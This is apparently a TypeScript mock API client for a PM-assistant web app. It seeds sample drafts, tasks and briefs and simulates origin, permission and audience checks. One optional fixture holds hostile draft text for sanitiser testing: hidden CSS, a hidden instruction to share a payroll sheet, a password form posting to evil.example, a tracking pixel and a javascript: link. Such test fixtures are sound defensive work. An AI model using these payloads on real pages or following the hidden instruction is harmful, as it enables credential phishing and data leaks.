import { stripMarkers } from '../citations';
import { MOCK_PERMISSIONS, MOCK_PROFILES, createMockAdmin, roleOfHandle } from './mockAdmin';
import type { MockAdminOptions, MockRole } from './mockAdmin';
import { ApiError, REJECT_REASONS } from './types';
import type {
  Api,
  AuthProvider,
  Brief,
  Draft,
  DraftSummary,
  FollowUp,
  HintName,
  Me,
  RejectReason,
  Suggestion,
  Task,
  TaskEvent,
} from './types';

export interface MockOptions extends MockAdminOptions {
  /** Who is signed in: a PM (default), an admin or an auditor. Signing in by handle (ada, audrey) also picks it. */
  role?: MockRole;
  /** Pretend network delay in ms. Tests use 0. */
  latency?: number;
  /** How long each task step and each suggestion takes, in ms. */
  stepMs?: number;
  /** false makes GET /api/brief answer 501 not_built. */
  briefBuilt?: boolean;
  onSignedOut?: () => void;
  /** Start signed in (tests). */
  signedIn?: boolean;
  /** Seed no drafts, as for a brand-new PM. */
  noDrafts?: boolean;
  /** Seed one draft whose text tries every trick (style, hidden text, form, remote image). */
  hostile?: boolean;
  /** The brief is built but has nothing in it. */
  emptyBrief?: boolean;
  /**
   * When the brief was last delivered: today (the default), a few days ago, or never. "never"
   * also leaves the brief empty, as for a PM who has not asked for one yet.
   */
  briefDelivery?: 'today' | 'stale' | 'never';
  /** Which sign-in methods GET /api/auth/providers lists. Default: development sign-in only. */
  providers?: AuthProvider[];
  /** Start with this first_visit value. */
  firstVisit?: boolean;
  /**
   * The Origin a browser sends with every write. By default the page's own origin, as a browser
   * would. `null` models a script that sends none: the mock then refuses every write with
   * `403 bad_origin`, as the real server does.
   */
  origin?: string | null;
  /** Add two Slack drafts whose channel is only checked when an approve is tried (external, and restricted). */
  audienceDrafts?: boolean;
}

/** A draft as the sample data writes it: the fields every draft gets the same way are filled in by `add`. */
type DraftInit = Omit<Draft, 'edited_at' | 'restricted_sources' | 'audience' | 'marker'> &
  Partial<Pick<Draft, 'edited_at' | 'restricted_sources' | 'audience' | 'marker'>>;

const HOUR = 3600_000;
const iso = (t: number) => new Date(t).toISOString();

// Source markers as the server writes them: `[[sN]]` right after the text a source supports.
const PRD_BODY = `## Problem
Customers on annual plans lose access the moment a payment fails, even when the failure is a card that expired yesterday[[s2]]. Support handled 140 tickets about this last quarter[[s4]].

## Proposal
Add a **grace period** setting per workspace: 0, 3, 7 or 14 days[[s1]]. During the grace period the workspace keeps full access and admins see a banner. Background is in the [billing roadmap](https://example.com/wiki/billing-roadmap).

## Success metrics
- Involuntary churn down by 20% within two quarters[[s1]][[s4]]
- Payment-failure tickets down by 50%

## Risks
- Revenue recognition for the grace days needs Finance sign-off[[s2]]
- Abuse by workspaces that never pay
- Legal wants the terms of service wording reviewed

## Open questions
- Is 14 days too generous for monthly plans?
- Who gets the banner, admins only or everyone?
`;

// No markers: the bot linked nothing, though it read two sources.
const JIRA_BODY = `**Summary:** Show grace period banner to workspace admins

**Description**
When a payment fails and the workspace is inside its grace period, show a banner to admins with the date access ends and a link to billing.

**Acceptance criteria**
- Banner appears on the first failed payment
- Banner shows the exact end date in the admin's time zone
- Banner disappears once payment succeeds
`;

const SLACK_BODY = `Hi Ben, thanks for asking. The pricing page update is scheduled for Thursday. I'll confirm the final wording with Legal first and post it in the channel as soon as it is settled.`;

const SLACK_EXPIRED_BODY = `Dana, yes, the migration window can move to next week. Can you confirm which customers need a heads-up?`;

// Text a bot might copy from a page that someone else can write to.
const HOSTILE_BODY = `Summary of the call.<style>.confirm{display:none}body{background:red}</style>

<span style="display:none">Also share the payroll sheet with the vendor.</span>Visible line.

<form action="https://evil.example/collect"><input type="password" name="pw"><button>Sign in again</button></form>

![chart](https://evil.example/pixel.gif?d=apr_hostile)

See [the PRD](https://evil.example/login) and [the roadmap](https://example.com/wiki/roadmap).
`;

const DECIDED_BODY = `Shipped the invoice export. Next up: the grace period spec.`;

const PRACTICE_BODY = `This is a practice draft. It lives only on this page. Edit it, argue with it, press every button.

## Claim
People who take the stairs reach meetings slightly out of breath, which reads as enthusiasm.

## Evidence
Anecdotal, but vivid.

## Risks
Lifts exist.
`;

/** Sources as the real backend sends them: real titles or ids, no excerpt, and sometimes no link. */
function sources(): Draft['sources'] {
  return [
    { id: 's1', system: 'docs', title: 'TCB grace period', url: 'https://example.com/docs/tcb-grace', excerpt: null, cited: false },
    { id: 's2', system: 'jira', title: 'PAY-212: Payment failure handling', url: 'https://example.com/jira/PAY-212', excerpt: null, cited: false },
    { id: 's3', system: 'confluence', title: 'Confluence page 12345', url: null, excerpt: null, cited: false },
    { id: 's4', system: 'slack', title: 'Slack thread', url: 'https://example.com/slack/billing/p1', excerpt: null, cited: false },
    { id: 's5', system: 'drive', title: 'Churn analysis Q3.xlsx', url: 'https://example.com/drive/churn-q3', excerpt: null, cited: false },
  ];
}

/** The sources of a body: each one is cited when the body has a marker for it. */
function citedBy(body: string, list: Draft['sources']): Draft['sources'] {
  return list.map((s) => ({ ...s, cited: body.includes(`[[${s.id}]]`) }));
}

interface MockTask {
  task: Task;
  startedAt: number;
  plan: { at: number; text: string }[];
  busy: boolean;
  outcome: 'done' | 'failed' | 'draft';
  draftId: string | null;
  settledAfter: number;
}

export function createMockClient(options: MockOptions = {}): Api {
  const latency = options.latency ?? 250;
  const stepMs = options.stepMs ?? 1200;
  const briefBuilt = options.briefBuilt ?? true;
  const now0 = Date.now();
  let seq = 100;
  const nextId = (p: string) => `${p}_${++seq}`;

  let signedIn = options.signedIn ?? false;
  const profile = MOCK_PROFILES[options.role ?? 'pm'];
  let role: MockRole = options.role ?? 'pm';
  const me: Me = {
    handle: profile.handle,
    name: profile.name,
    roles: [...profile.roles],
    permissions: [...MOCK_PERMISSIONS[role]],
    csrf_token: 'mock-csrf-token',
    first_visit: options.firstVisit ?? !!options.noDrafts,
    hints_seen: [],
    nudges: true,
  };

  const drafts = new Map<string, Draft>();
  /** Slack channels that turn out to be shared outside the company only once an approve checks them. */
  const hiddenExternal = new Set<string>();
  const add = (init: DraftInit): Draft => {
    const d = init as Draft;
    d.version ??= '1';
    d.edited_at ??= null;
    d.restricted_sources ??= false;
    // Only a Slack draft has an audience, and its numbers are null until an approve checks the channel.
    d.audience ??= d.kind.startsWith('slack') ? { members: null, external: null } : null;
    d.marker ??= d.practice ? null : d.kind.startsWith('slack') ? '_Drafted with PM OS_' : `Drafted with PM OS · run ${d.task_id ?? 'tsk_01JD7Q'}`;
    drafts.set(d.id, d);
    return d;
  };
  const bump = (d: Draft) => {
    d.version = String(Number(d.version ?? '1') + 1);
  };

  if (!options.noDrafts) {
    add({
      id: 'apr_prd',
      kind: 'confluence_page',
      title: 'PRD: TCB grace period setting',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 2 * HOUR),
      expires_at: null,
      task_id: null,
      practice: false,
      body: PRD_BODY,
      edited: false,
      target: { system: 'confluence', label: 'Space PM, under “Specs”', url: null },
      sources: citedBy(PRD_BODY, sources()),
      result_url: null,
      external: false,
      restricted_sources: true,
    });
    add({
      id: 'apr_jira',
      kind: 'jira_issue',
      title: 'Show grace period banner to workspace admins',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 3 * HOUR),
      expires_at: null,
      task_id: null,
      practice: false,
      body: JIRA_BODY,
      edited: false,
      target: { system: 'jira', label: 'Project PAY, a new Story under PAY-212: TCB grace period', url: null },
      sources: sources().slice(0, 2),
      result_url: null,
      external: false,
    });
    add({
      id: 'apr_slack',
      kind: 'slack_reply',
      title: 'Reply in a Slack thread',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 1 * HOUR),
      expires_at: iso(now0 + 23 * HOUR),
      task_id: null,
      practice: false,
      body: SLACK_BODY,
      edited: false,
      target: { system: 'slack', label: 'A Slack thread', url: 'https://example.com/slack/partner-pricing/p1' },
      sources: [],
      result_url: null,
      external: true,
    });
    if (options.audienceDrafts) {
    // Its channel is shared outside the company, which PM OS finds out only when an approve is tried.
      add({
        id: 'apr_slack_ext',
        kind: 'slack_message',
        title: 'Message to a Slack channel',
        bot: 'pm-ana',
        status: 'pending',
        created_at: iso(now0 - 90 * 60_000),
        expires_at: iso(now0 + 22 * HOUR),
        task_id: null,
        practice: false,
        body: 'Heads up, the grace period setting ships behind a flag next week. Shout if your workspace needs it earlier.',
        edited: false,
        target: { system: 'slack', label: 'A Slack channel', url: 'https://example.com/slack/launch-news' },
        sources: [],
        result_url: null,
        external: false,
      });
      hiddenExternal.add('apr_slack_ext');
      // Built from restricted sources, and its channel turns out to be visible outside the product team.
      add({
        id: 'apr_slack_blocked',
        kind: 'slack_reply',
        title: 'Reply in a Slack thread',
        bot: 'pm-ana',
        status: 'pending',
        created_at: iso(now0 - 100 * 60_000),
        expires_at: iso(now0 + 21 * HOUR),
        task_id: null,
        practice: false,
        body: 'Churn on annual plans fell 4 points after the retry change[[s1]]. I can share the breakdown once Finance has checked it.',
        edited: false,
        target: { system: 'slack', label: 'A Slack thread', url: 'https://example.com/slack/partner-pricing/p2' },
        sources: citedBy('[[s1]]', sources().slice(0, 1)),
        result_url: null,
        external: false,
        restricted_sources: true,
      });
      hiddenExternal.add('apr_slack_blocked');
    }
    add({
      id: 'apr_slack_old',
      kind: 'slack_message',
      title: 'Direct message',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 30 * HOUR),
      expires_at: iso(now0 - 6 * HOUR),
      task_id: null,
      practice: false,
      body: SLACK_EXPIRED_BODY,
      edited: false,
      target: { system: 'slack', label: 'A direct message', url: 'https://example.com/slack/dm/p3' },
      sources: [],
      result_url: null,
      external: false,
    });
    add({
      id: 'apr_done',
      kind: 'confluence_page',
      title: 'Weekly update, 9 November',
      bot: 'pm-ana',
      status: 'approved',
      created_at: iso(now0 - 7 * 24 * HOUR),
      expires_at: null,
      task_id: null,
      practice: false,
      body: DECIDED_BODY,
      edited: true,
      target: { system: 'confluence', label: 'Space PM, under “Updates”', url: null },
      // Edited by the PM, so its source links were removed and nothing counts as cited.
      sources: sources().slice(0, 2),
      result_url: 'https://example.com/wiki/weekly-9-nov',
      external: false,
    });
  }

  if (options.hostile) {
    add({
      id: 'apr_hostile',
      kind: 'confluence_page',
      title: 'Vendor call notes',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 4 * HOUR),
      expires_at: null,
      task_id: null,
      practice: false,
      body: HOSTILE_BODY,
      edited: false,
      target: { system: 'confluence', label: 'Space PM, under “Notes”', url: null },
      sources: [{ id: 'h1', system: 'docs', title: 'Odd link source', url: 'javascript:alert(1)', excerpt: null, cited: false }],
      result_url: null,
      external: false,
    });
  }

  const suggestions = new Map<string, { s: Suggestion; at: number; ready: string }>();
  const tasks = new Map<string, MockTask>();
  const failedOnce = new Set<string>();

  // Earlier requests, so Activity and the home page have a history to show.
  if (!options.noDrafts) {
    const seed = (id: string, text: string, ago: number, rest: Partial<Task>) => {
      const at = now0 - ago;
      const ev = (t: string, dt: number): TaskEvent => ({ at: iso(at + dt), kind: 'milestone', text: t });
      const task: Task = {
        id,
        bot: 'pm-ana',
        text,
        status: 'done',
        result: null,
        error: null,
        draft_ids: [],
        created_at: iso(at),
        updated_at: iso(at + 40_000),
        progress: null,
        retrying: false,
        events: [
          ev('Reading Jira', 2000),
          ev('Reading Confluence', 10_000),
          ev('Putting the answer together', 30_000),
        ],
        ...rest,
      };
      tasks.set(id, { task, startedAt: at, plan: [], busy: false, outcome: 'done', draftId: null, settledAfter: 0 });
    };
    seed('tsk_seed_failed', 'Summarize the DPA thread with Legal', 3 * 24 * HOUR, {
      status: 'failed',
      error: 'I could not reach Slack just now, so I stopped before guessing. Try again in a moment.',
    });
    seed('tsk_seed_week', 'What changed in billing this week?', 26 * HOUR, {
      result:
        '## Billing this week\n\n- **PAY-212** moved to *Blocked*, waiting on Finance sign-off\n- The grace period spec got two new comments from Legal\n- Support tickets about lock-outs are down 12% on last week\n\nNothing needs you right now, but Finance is the one to watch.',
    });
    seed('tsk_seed_prd', 'Draft a PRD for the TCB grace period setting', 2 * HOUR + 5 * 60_000, {
      status: 'needs_approval',
      draft_ids: ['apr_prd'],
      result: 'The draft is ready, with the sources I read alongside it.',
    });
    const prd = drafts.get('apr_prd');
    if (prd) prd.task_id = 'tsk_seed_prd';
  }

  const followUps = {
    waiting_on_you: [
      { id: 'fu_1', system: 'slack', who: 'Ben', summary: 'asked about the pricing page', url: 'https://example.com/slack/ben', age_days: 2 },
      { id: 'fu_2', system: 'jira', who: 'Priya', summary: 'asked for a decision on PAY-230', url: 'https://example.com/jira/PAY-230', age_days: 4 },
    ] as FollowUp[],
    you_wait_on: [
      { id: 'fu_3', system: 'slack', who: 'Legal', summary: 'the DPA question', url: 'https://example.com/slack/legal', age_days: 3 },
    ] as FollowUp[],
  };

  const wait = async () => {
    if (latency > 0) await new Promise((r) => setTimeout(r, latency));
  };
  // A browser sends Origin with every write; a script that sends none is refused, as the real server does.
  const origin = options.origin === undefined ? (globalThis.location?.origin ?? null) : options.origin;
  const hasOrigin = origin !== null && origin !== 'null' && origin !== '';
  /** Every POST, PUT and DELETE: checked before the session, as on the real server. */
  const write = () => {
    if (!hasOrigin) {
      throw new ApiError(403, 'bad_origin', 'That request did not come from this app, so I refused it.');
    }
  };
  const guard = () => {
    if (!signedIn) {
      options.onSignedOut?.();
      throw new ApiError(401, 'signed_out', 'You are signed out.');
    }
  };
  const find = (id: string): Draft => {
    const d = drafts.get(id);
    if (!d) throw new ApiError(404, 'not_found', 'I could not find that draft.');
    return d;
  };
  const clone = <T,>(v: T): T => structuredClone(v);
  const summary = (d: Draft): DraftSummary => {
    const {
      id, kind, title, bot, status, created_at, expires_at, task_id, practice,
    } = d;
    return { id, kind, title, bot, status, created_at, expires_at, task_id, practice };
  };
  const pendingOnly = (d: Draft) => {
    if (d.status !== 'pending') throw new ApiError(409, 'not_pending', 'This draft has already been decided.');
  };

  function makeDraftFromTask(text: string, taskId: string): Draft {
    const slack = /reply|nudge/i.test(text);
    const id = nextId('apr');
    const init: DraftInit = slack
      ? {
          id,
          kind: 'slack_reply',
          title: 'Reply in a Slack thread',
          bot: 'pm-ana',
          status: 'pending',
          created_at: iso(Date.now()),
          expires_at: iso(Date.now() + 24 * HOUR),
          task_id: taskId,
          practice: false,
          body: /nudge/i.test(text)
            ? 'Hi Legal, a gentle nudge on the DPA question from Thursday. Even a rough ETA would help me plan the launch.'
            : SLACK_BODY,
          edited: false,
          target: { system: 'slack', label: 'A Slack thread', url: 'https://example.com/slack/billing/p9' },
          sources: [],
          result_url: null,
          external: false,
        }
      : {
          id,
          kind: 'confluence_page',
          title: 'PRD: ' + (text.replace(/^(draft|write)( a| the)?( prd)?( for| about)?/i, '').trim() || 'new feature'),
          bot: 'pm-ana',
          status: 'pending',
          created_at: iso(Date.now()),
          expires_at: null,
          task_id: taskId,
          practice: false,
          body: PRD_BODY,
          edited: false,
          target: { system: 'confluence', label: 'Space PM, under “Specs”', url: null },
          sources: citedBy(PRD_BODY, sources()),
          result_url: null,
          external: false,
        };
    return add(init);
  }

  function startTask(text: string): Task {
    const id = nextId('tsk');
    const t0 = Date.now();
    const wantsDraft = /draft|prd|write|reply|nudge/i.test(text);
    const failing = /fail|break/i.test(text) && !failedOnce.has(text);
    if (failing) failedOnce.add(text);
    // The backend sends milestones only, plus a checklist count and a retry flag.
    const plan = [
      { at: 0, text: 'Reading Jira' },
      { at: 1, text: 'Reading Confluence' },
      { at: 2, text: wantsDraft ? 'Writing the draft' : 'Putting the answer together' },
    ];
    const task: Task = {
      id,
      bot: 'pm-ana',
      text,
      status: 'queued',
      result: null,
      error: null,
      draft_ids: [],
      created_at: iso(t0),
      updated_at: iso(t0),
      progress: null,
      retrying: false,
      events: [],
    };
    tasks.set(id, {
      task,
      startedAt: t0,
      plan: plan.map((p) => ({ ...p, at: p.at * stepMs })),
      busy: /busy/i.test(text),
      outcome: failing ? 'failed' : wantsDraft ? 'draft' : 'done',
      draftId: null,
      settledAfter: (/busy/i.test(text) ? 12 : 3) * stepMs,
    });
    return clone(task);
  }

  function advance(m: MockTask): Task {
    const elapsed = Date.now() - m.startedAt;
    const t = m.task;
    if (t.status === 'done' || t.status === 'failed' || t.status === 'needs_approval') {
      t.retrying = false;
      return t;
    }
    const events: TaskEvent[] = [];
    for (const p of m.plan) {
      if (elapsed >= p.at) {
        events.push({ at: iso(m.startedAt + p.at), kind: 'milestone', text: p.text });
      }
    }
    t.events = events;
    // A checklist of the three steps appears once the first one is under way.
    t.progress = events.length > 0 ? { done: Math.max(events.length - 1, 0), total: m.plan.length } : null;
    t.retrying = m.busy && elapsed >= 1.3 * stepMs && elapsed < 11 * stepMs;
    t.status = elapsed > 0 || stepMs === 0 ? 'working' : 'queued';
    if (elapsed >= m.settledAfter) {
      t.progress = t.progress ? { done: t.progress.total, total: t.progress.total } : null;
      t.retrying = false;
      t.updated_at = iso(Date.now());
      if (m.outcome === 'failed') {
        t.status = 'failed';
        t.error = 'I could not reach Jira just now, so I stopped before guessing. Try again in a moment.';
      } else if (m.outcome === 'draft') {
        const d = makeDraftFromTask(t.text, t.id);
        t.status = 'needs_approval';
        t.draft_ids = [d.id];
        t.result = 'The draft is ready, with the sources I read alongside it.';
      } else {
        t.status = 'done';
        t.result = `Here is what I found.\n\n- **PAY-212** moved to Blocked yesterday\n- Two new comments on the *grace period* spec\n- Nothing new in #billing\n\nYou asked: "${t.text}"`;
      }
    }
    return t;
  }

  const admin = createMockAdmin(now0, options, () => [...drafts.values()].filter((d) => d.status === 'pending' && !d.practice).length);
  /** The server's matrix: a role without the permission gets 403 forbidden. */
  const need = (...wanted: string[]) => {
    guard();
    if (!wanted.some((w) => (me.permissions ?? []).includes(w))) {
      throw new ApiError(403, 'forbidden', 'Your role does not allow this.');
    }
  };

  return {
    async providers() {
      await wait();
      return [...(options.providers ?? ['dev'])];
    },
    async devLogin(handle) {
      await wait();
      write();
      if (!handle.trim()) throw new ApiError(403, 'not_a_member', 'That handle is not on the team.');
      if (handle.trim().toLowerCase() === 'nobody') {
        throw new ApiError(403, 'not_a_member', 'That handle is not on the team list, so I can not sign you in.');
      }
      signedIn = true;
      me.handle = handle.trim().toLowerCase();
      // A handle that names a role signs in as that role; any other keeps the role the client started with.
      const named = roleOfHandle(me.handle);
      if (named) {
        role = named;
        me.name = MOCK_PROFILES[named].name;
        me.roles = [...MOCK_PROFILES[named].roles];
        me.permissions = [...MOCK_PERMISSIONS[named]];
      }
    },
    async logout() {
      await wait();
      write();
      signedIn = false;
    },
    async me() {
      await wait();
      guard();
      return clone(me);
    },
    async setNudges(nudges) {
      await wait();
      write();
      guard();
      me.nudges = nudges;
      return clone(me);
    },
    async markHintSeen(seen: HintName) {
      await wait();
      write();
      guard();
      if (!me.hints_seen.includes(seen)) me.hints_seen.push(seen);
      return clone(me);
    },
    async resetHints() {
      await wait();
      write();
      guard();
      me.hints_seen = [];
      return clone(me);
    },

    async listDrafts() {
      await wait();
      guard();
      const all = [...drafts.values()].sort((a, b) => b.created_at.localeCompare(a.created_at));
      const pending = all.filter((d) => d.status === 'pending');
      const decided = all.filter((d) => d.status !== 'pending').slice(0, 20);
      return [...pending, ...decided].map(summary);
    },
    async getDraft(id) {
      await wait();
      guard();
      const d = find(id);
      me.first_visit = false;
      return clone(d);
    },
    async saveDraft(id, input) {
      await wait();
      write();
      guard();
      const d = find(id);
      pendingOnly(d);
      // The server removes any marker it is sent, and an edited draft cites nothing.
      d.body = stripMarkers(input.body);
      if (input.title !== undefined) d.title = stripMarkers(input.title);
      d.edited = true;
      d.edited_at = iso(Date.now());
      d.sources = d.sources.map((s) => ({ ...s, cited: false }));
      bump(d);
      return clone(d);
    },
    async requestChange(id, instruction) {
      await wait();
      write();
      guard();
      const d = find(id);
      pendingOnly(d);
      if (suggestions.get(id)?.s.status === 'working') {
        throw new ApiError(409, 'change_in_progress', 'I am still working on your last change.');
      }
      const current = stripMarkers(d.body);
      const lines = current.split('\n');
      let next: string;
      if (/short|trim|cut/i.test(instruction)) {
        // drop the last paragraph block
        const blocks = current.trimEnd().split(/\n\n/);
        next = (blocks.length > 1 ? blocks.slice(0, -1) : blocks).join('\n\n') + '\n';
        // and tighten a sentence, so the before and after shows changed words too
        next = next.replace('lose access the moment a payment fails, even when the failure is a card that expired yesterday', 'lose access the moment a payment fails, even when the card only expired yesterday');
      } else {
        next = [...lines.filter((l, i) => !(i === lines.length - 1 && l === '')), '', `_Revised: ${instruction}_`, ''].join('\n');
      }
      const failing = /fail/i.test(instruction);
      const s: Suggestion = { status: 'working', instruction, body: null, error: null };
      suggestions.set(id, { s, at: Date.now(), ready: next });
      if (failing) suggestions.get(id)!.ready = '\u0000fail';
      return clone(s);
    },
    async getSuggestion(id) {
      await wait();
      guard();
      find(id);
      const entry = suggestions.get(id);
      if (!entry) return null;
      if (entry.s.status === 'working' && Date.now() - entry.at >= stepMs) {
        if (entry.ready === '\u0000fail') {
          entry.s = { ...entry.s, status: 'failed', error: 'I could not make that change. Try saying it another way.' };
        } else {
          entry.s = { ...entry.s, status: 'ready', body: entry.ready };
        }
      }
      return clone(entry.s);
    },
    async acceptSuggestion(id) {
      await wait();
      write();
      guard();
      const d = find(id);
      pendingOnly(d);
      const entry = suggestions.get(id);
      if (!entry || entry.s.status !== 'ready' || entry.s.body === null) {
        throw new ApiError(409, 'no_suggestion', 'There is no suggestion to accept.');
      }
      d.body = stripMarkers(entry.s.body);
      d.edited = true;
      d.sources = d.sources.map((s) => ({ ...s, cited: false }));
      bump(d);
      suggestions.delete(id);
      return clone(d);
    },
    async rejectSuggestion(id) {
      await wait();
      write();
      guard();
      const d = find(id);
      suggestions.delete(id);
      return clone(d);
    },
    async approve(id, o) {
      await wait();
      write();
      guard();
      const d = find(id);
      pendingOnly(d);
      if (d.expires_at && Date.parse(d.expires_at) < Date.now()) {
        d.status = 'expired';
        throw new ApiError(409, 'expired', 'This Slack draft expired after 24 hours, so it was not sent.');
      }
      if (o?.version !== undefined && o.version !== d.version) {
        throw new ApiError(409, 'stale', 'This draft changed after you opened it.');
      }
      // An approve is when PM OS looks at the channel: from then on the audience is known.
      if (hiddenExternal.has(d.id)) {
        d.audience = { members: 14, external: true };
        d.external = true;
        if (d.restricted_sources) {
          throw new ApiError(409, 'audience_blocked', 'This was built from restricted sources, and people outside the product team can see that channel.');
        }
        if (!o?.confirmExternal) {
          throw new ApiError(409, 'needs_external_confirm', 'This channel is shared outside the company. Confirm to send it there.');
        }
      } else if (d.external && !o?.confirmExternal) {
        throw new ApiError(409, 'needs_external_confirm', 'This channel is shared outside the company. Confirm to send it there.');
      }
      if (d.audience && d.audience.members === null) d.audience = { members: d.external ? 14 : 6, external: d.external };
      d.status = 'approved';
      d.result_url = d.practice ? null : `https://example.com/${d.target.system}/${d.id}`;
      return clone(d);
    },
    async reject(id, reason?: RejectReason) {
      await wait();
      write();
      guard();
      const d = find(id);
      pendingOnly(d);
      if (reason && !REJECT_REASONS.includes(reason)) {
        throw new ApiError(400, 'bad_request', 'That is not a reason I know.');
      }
      d.status = 'rejected';
      return clone(d);
    },
    async createPractice() {
      await wait();
      write();
      guard();
      const existing = [...drafts.values()].find((d) => d.practice && d.status === 'pending');
      if (existing) return clone(existing);
      const d = add({
        id: nextId('prc'),
        kind: 'confluence_page',
        title: 'Practice: why PMs should take the stairs',
        bot: 'pm-ana',
        status: 'pending',
        created_at: iso(Date.now()),
        expires_at: null,
        task_id: null,
        practice: true,
        body: PRACTICE_BODY,
        edited: false,
        target: { system: 'confluence', label: 'Nowhere. This is a practice draft.', url: null },
        sources: sources().slice(0, 3),
        result_url: null,
        external: false,
      });
      return clone(d);
    },
    async deleteDraft(id) {
      await wait();
      write();
      guard();
      const d = find(id);
      if (!d.practice) throw new ApiError(409, 'not_practice', 'Only practice drafts can be deleted.');
      drafts.delete(id);
    },

    async createTask(text) {
      await wait();
      write();
      guard();
      return startTask(text);
    },
    async getTask(id) {
      await wait();
      guard();
      const m = tasks.get(id);
      if (!m) throw new ApiError(404, 'not_found', 'I could not find that task.');
      return clone(advance(m));
    },
    async listTasks() {
      await wait();
      guard();
      return [...tasks.values()].map((m) => {
        const t = clone(advance(m));
        delete t.events;
        return t;
      });
    },

    async brief(): Promise<Brief> {
      await wait();
      guard();
      if (!briefBuilt) throw new ApiError(501, 'not_built', 'The daily brief is not built yet.');
      const delivery = options.briefDelivery ?? 'today';
      const delivered_at =
        delivery === 'never' ? null : delivery === 'stale' ? iso(Date.now() - 3 * 24 * HOUR) : iso(Date.now() - 1000);
      const status = delivery;
      if (options.emptyBrief || delivery === 'never') {
        return { date: iso(Date.now()).slice(0, 10), changed: [], waiting_on_you: [], you_wait_on: [], delivered_at, status };
      }
      return {
        delivered_at,
        status,
        date: iso(Date.now()).slice(0, 10),
        // A brief that came before today has no `changed` items; its follow-ups are the ones not yet expired.
        changed:
          delivery === 'stale'
            ? []
            : [{ system: 'jira', title: 'PAY-212 moved to Blocked', summary: 'Waiting on Finance sign-off.', url: 'https://example.com/jira/PAY-212' }],
        waiting_on_you: clone(followUps.waiting_on_you),
        you_wait_on: clone(followUps.you_wait_on),
      };
    },
    async dismissFollowup(id) {
      await wait();
      write();
      guard();
      followUps.waiting_on_you = followUps.waiting_on_you.filter((f) => f.id !== id);
      followUps.you_wait_on = followUps.you_wait_on.filter((f) => f.id !== id);
    },
    async draftFollowup(id) {
      await wait();
      write();
      guard();
      const all = [...followUps.waiting_on_you, ...followUps.you_wait_on];
      const f = all.find((x) => x.id === id);
      if (!f) throw new ApiError(404, 'not_found', 'I could not find that follow-up.');
      const mine = followUps.waiting_on_you.some((x) => x.id === id);
      return startTask(mine ? `Draft a reply to ${f.who}` : `Draft a nudge to ${f.who}`);
    },

    async adminOverview() {
      await wait();
      need('view-audit-log', 'manage-members');
      return admin.overview();
    },
    async adminAudit(q) {
      await wait();
      need('view-audit-log');
      return admin.audit(q);
    },
    async adminAuditExport(q) {
      await wait();
      need('export-audit');
      return admin.auditExport(q);
    },
    async adminTeam() {
      await wait();
      need('view-audit-log', 'manage-members');
      return admin.team();
    },
    async adminConnectors() {
      await wait();
      need('manage-connectors');
      return admin.connectors();
    },
  };
}
